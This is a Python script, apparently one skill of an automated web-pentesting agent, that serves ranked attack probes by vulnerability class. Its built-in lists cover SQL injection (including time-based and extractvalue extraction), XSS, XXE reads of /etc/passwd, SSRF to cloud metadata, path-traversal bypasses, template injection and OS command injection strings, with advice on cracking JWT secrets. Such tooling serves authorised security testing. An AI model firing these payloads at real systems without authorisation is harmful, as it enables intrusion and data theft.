#!/usr/bin/env python3
"""
run.py -- payload-library entry point.

Queryable payload/wordlist arsenal. Reads JSON on stdin, returns a small TARGETED
set of probe strings for a vuln_class (optionally narrowed by technique), drawn from
curated built-ins plus the shipped wordlist/payload asset files of sibling skills.
Pure file lookup: NO network, standard library only (egress: none).

CONTRACT
--------
* Input  : {"vuln_class": "sqli", "technique": "error", "limit": 8}
           technique and limit are optional. limit default 8, capped at 50.
* Output : one strict JSON artifact on stdout (references/ARTIFACT_SCHEMA.md).
           On any fatal error, a schema-valid artifact with meta.status == "error".
"""
from __future__ import annotations

import json
import os
import sys
from datetime import datetime, timezone
from typing import Any, Dict, List

SKILLS_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))


def _read_lines(rel: str, limit: int = 60) -> List[str]:
    """Read non-comment, non-blank lines from a sibling skill's asset file."""
    path = os.path.join(SKILLS_ROOT, rel)
    out: List[str] = []
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            for line in fh:
                s = line.strip()
                if not s or s.startswith("#"):
                    continue
                out.append(s)
                if len(out) >= limit:
                    break
    except OSError:
        pass
    return out


def _read_json(rel: str) -> Any:
    path = os.path.join(SKILLS_ROOT, rel)
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            return json.load(fh)
    except (OSError, ValueError):
        return None


def p(value: str, note: str, technique: str = "") -> Dict[str, str]:
    d = {"value": value, "note": note}
    if technique:
        d["technique"] = technique
    return d


# Curated, high-signal, cheap-probe-first built-ins per class. The FIRST entries are
# the cheapest triage probes; later entries are heavier follow-ups to send only after
# a probe shows signal.
BUILTINS: Dict[str, List[Dict[str, str]]] = {
    "sqli": [
        p("'", "single quote -> a SQL/DB error or 500 in the response = injectable (error-based)", "error"),
        p("' AND '1'='1", "vs the '1'='2 control below: same response = not injectable, different = boolean oracle", "boolean"),
        p("' AND '1'='2", "the FALSE half of the boolean pair; compare against the TRUE half", "boolean"),
        p("1) AND (1=1", "paren-context boolean probe when the value sits inside a function/IN()", "boolean"),
        p("' AND SLEEP(3)-- -", "response delayed ~3s vs a control = time-based (use sparingly)", "time"),
        p("' UNION SELECT null-- -", "column-count / union probe once error or boolean confirms injectable", "union"),
        p("extractvalue(1,concat(0x7e,version()))", "MySQL error-based extraction once error-based confirmed", "error"),
    ],
    "xss_reflected": [
        p("sahwXSS<script>1</script>", "look for the UNENCODED <script> reflected back with text/html content-type", "reflection"),
        p("\"'><svg/onload=alert(1)>", "attribute/tag breakout reflected unencoded", "reflection"),
        p("javascript:alert(1)", "href/src sink that reflects a javascript: URI", "reflection"),
    ],
    "xss_stored": [
        p("sahwSTORED<script>2</script>", "store this, then READ the listing/render endpoint back: script returned verbatim = stored", "stored"),
    ],
    "xxe": [
        p("<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
          "send with Content-Type/Accept application/xml; root:x:0:0 in the response = XXE file read", "file"),
        p("<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"file:///etc/hostname\">%p;]><r/>",
          "parameter-entity variant if the direct entity is filtered", "file"),
    ],
    "ssrf": [
        p("http://127.0.0.1/", "reachable-loopback probe: compare its response code/message to an unreachable-host probe = boolean oracle", "oracle"),
        p("http://10.255.255.1/", "unreachable target: the NEGATIVE half of the oracle pair", "oracle"),
        p("http://169.254.169.254/latest/meta-data/", "cloud metadata (benign path) if internal fetch is allowed", "metadata"),
    ],
    "path_traversal": [
        p("../../../../../../etc/passwd", "root:x:0:0 in the response vs a benign filename control = traversal", "file"),
        p("....//....//....//etc/passwd", "doubled-dot bypass if the plain sequence is filtered", "file"),
        p("..%2f..%2f..%2fetc%2fpasswd", "url-encoded traversal bypass", "file"),
    ],
    "idor": [
        p("<other-users-id>", "send another session's own resource id; A's session returning B's record = IDOR (body_contains vs own-id control)", "access"),
    ],
    "business_logic": [
        p("-1", "negative amount/quantity accepted where only positive is valid (compare success code)", "boundary"),
        p("0", "zero-value edge accepted", "boundary"),
        p("abc", "non-numeric where a number is required (type-confusion / isset-only check)", "type"),
        p("1.00000001", "float/precision abuse", "boundary"),
    ],
    "auth_bypass": [
        p("<wrong-current-value>", "supply a WRONG current-credential/factor and see if the state change still succeeds", "logic"),
    ],
    "weak_password_policy": [
        p("a", "1-char password at signup/change: accepted then authenticates = weak policy", "policy"),
    ],
    "disposable_email_accepted": [
        p("sahwtest@mailinator.com", "disposable-domain email accepted at signup = disposable_email_accepted", "policy"),
    ],
    "user_enumeration": [
        p("<known-valid-identifier>", "vs an unregistered one: distinct code/message between the two = enumeration oracle", "oracle"),
        p("definitely-not-a-user-zzzz", "the NEGATIVE half: an identifier that certainly does not exist", "oracle"),
    ],
    "forced_browsing": [
        p("/info.php", "phpinfo/debug page returning 200", "route"),
        p("/.git/config", "exposed VCS metadata", "route"),
        p("/actuator/health", "framework debug/mgmt route", "route"),
    ],
    "rate_limit_absence": [
        p("<same-request-x12>", "send the SAME request >=10 times; NO 429/lockout status across the burst = rate_limit_absence (status_in)", "burst"),
    ],
    "crypto_disclosure": [
        p("<read-source-for-key>", "read the source file that intel says holds the hardcoded key/IV, extract the literal, then prove with the derived deriver", "disclosure"),
    ],
    "jwt_weak_key": [
        p("<decode-the-JWT-header>", "if alg==HS256, crack the secret against the candidate list below (hs256_weak_key deriver)", "crack"),
    ],
    "deserialization_rce": [
        p("<serialized-gadget>", "craft the language's serialized object with a benign filesystem side effect, then read the marker back (file_created_then_deleted)", "gadget"),
    ],
    # --- expanded categories (deep-mode systematic sweep) --------------------------
    # These four have no benchmark vuln_class of their own; the sweep addresses them by
    # KEY and reports a confirmed hit under the nearest scored class (dom/html -> an xss
    # class; ssti/command injection -> the injection/rce impact they culminate in). Each
    # payload embeds a UNIQUE canary so the fuzz oracle can prove reflection/evaluation.
    "dom_xss": [
        p("#<img src=x onerror=alert(1)>", "hash-fragment sink: rendered into the DOM client-side (prove with a browser/xss-dom-sinks, not HTTP body)", "sink"),
        p("javascript:alert(1)", "location/href sink that executes a javascript: URI", "sink"),
        p("\";alert(1)//", "string-break into an eval/innerHTML/document.write sink", "sink"),
        p("<svg onload=alert(1)>", "reflected-into-DOM markup that a client sink executes", "sink"),
    ],
    "html_injection": [
        p("<u>sahwHTML1</u>", "unescaped tag reflected verbatim (body_contains the tag, absent in a benign-text control)", "reflection"),
        p("<a href=//sahw.example>x</a>", "injected anchor/markup rendered unescaped", "reflection"),
        p("<img src=x>", "bare tag reflected unescaped", "reflection"),
    ],
    "ssti": [
        p("${{7*7}}", "if the response contains the COMPUTED 49 (not the literal payload), the template engine evaluated it; control sends {{6*6}}->36", "eval"),
        p("{{7*7}}", "Jinja2/Twig/Nunjucks arithmetic evaluation probe -> computed 49", "eval"),
        p("<%= 7*7 %>", "ERB/EJS evaluation probe -> computed 49", "eval"),
        p("#{7*7}", "Ruby/Thymeleaf-style evaluation probe -> computed 49", "eval"),
        p("*{7*7}", "Spring EL evaluation probe -> computed 49", "eval"),
    ],
    "command_injection": [
        p("; echo sahwCMD42", "the COMPUTED marker sahwCMD42 in the response (not the literal payload) = OS command executed", "exec"),
        p("| id", "output containing uid=/gid= = command executed", "exec"),
        p("$(id)", "command substitution -> uid= in the response", "exec"),
        p("`id`", "backtick substitution variant", "exec"),
        p("& whoami", "windows/chained command variant", "exec"),
        p("\n id \n", "newline-injected command when the value lands in a shell context", "exec"),
    ],
}

# vuln_class -> sibling asset files to augment the built-ins.
ASSET_MAP: Dict[str, List[str]] = {
    "ssrf": ["ssrf-internal-pivot/assets/ssrf-payloads.txt"],
    "jwt_weak_key": ["token-session-forensics/assets/jwt_secrets.txt"],
    "forced_browsing": ["intelligent-crawling/assets/wordlists/directories-fallback.txt"],
    "business_logic": ["api-graphql-specifics/assets/mass-assignment-fields.txt"],
    "sqli": ["injection-battery-xxe-ssti-nosql/assets/injection-payloads.json"],
    "xxe": ["injection-battery-xxe-ssti-nosql/assets/injection-payloads.json"],
    "ssti": ["injection-battery-xxe-ssti-nosql/assets/injection-payloads.json"],
}


def _augment_from_assets(vuln_class: str, technique: str, want: int) -> (List[Dict[str, str]], List[str]):
    payloads: List[Dict[str, str]] = []
    sources: List[str] = []
    for rel in ASSET_MAP.get(vuln_class, []):
        if rel.endswith(".json"):
            data = _read_json(rel)
            if isinstance(data, dict):
                # injection-payloads.json: pull the section matching the class/technique.
                for key, arr in data.items():
                    if vuln_class.split("_")[0] not in key.lower() and (technique and technique not in key.lower()):
                        continue
                    if isinstance(arr, list):
                        for v in arr[:want]:
                            payloads.append(p(str(v), f"from {os.path.basename(rel)}:{key}"))
                sources.append(rel)
        else:
            lines = _read_lines(rel, limit=want)
            for v in lines:
                payloads.append(p(v, f"candidate from {os.path.basename(rel)}"))
            if lines:
                sources.append(rel)
    return payloads, sources


def main() -> int:
    raw = sys.argv[1] if len(sys.argv) > 1 else sys.stdin.read()
    try:
        req = json.loads(raw) if raw.strip() else {}
    except ValueError:
        req = {}
    vuln_class = str(req.get("vuln_class", "")).strip()
    technique = str(req.get("technique", "")).strip().lower()
    try:
        limit = int(req.get("limit", 8))
    except (TypeError, ValueError):
        limit = 8
    limit = max(1, min(limit, 50))

    now = datetime.now(timezone.utc).isoformat()

    if not vuln_class:
        art = {
            "vuln_class": "", "technique": technique, "count": 0, "payloads": [],
            "sources": [], "usage": "supply a vuln_class",
            "meta": {"skill": "payload-library", "status": "error", "generated_at": now,
                     "error": "vuln_class is required"},
        }
        print(json.dumps(art))
        return 0

    built = list(BUILTINS.get(vuln_class, []))
    if technique:
        narrowed = [x for x in built if x.get("technique", "").lower() == technique]
        built = narrowed or built  # fall back to all if the technique filter empties it

    asset_payloads, sources = _augment_from_assets(vuln_class, technique, limit)

    combined = built + asset_payloads
    # de-dup by value, preserve order (built-ins first = cheapest probes first)
    seen = set()
    deduped: List[Dict[str, str]] = []
    for x in combined:
        if x["value"] in seen:
            continue
        seen.add(x["value"])
        deduped.append(x)
    payloads = deduped[:limit]

    art = {
        "vuln_class": vuln_class,
        "technique": technique,
        "count": len(payloads),
        "payloads": payloads,
        "sources": (["built-in"] if built else []) + sources,
        "usage": "Fire ONE cheap probe first (top of list); escalate the heavier "
                 "payloads or a confirmation tool ONLY on a positive/near-positive "
                 "signal, on that one endpoint+parameter.",
        "meta": {"skill": "payload-library", "status": "ok", "generated_at": now},
    }
    print(json.dumps(art))
    return 0


if __name__ == "__main__":
    sys.exit(main())
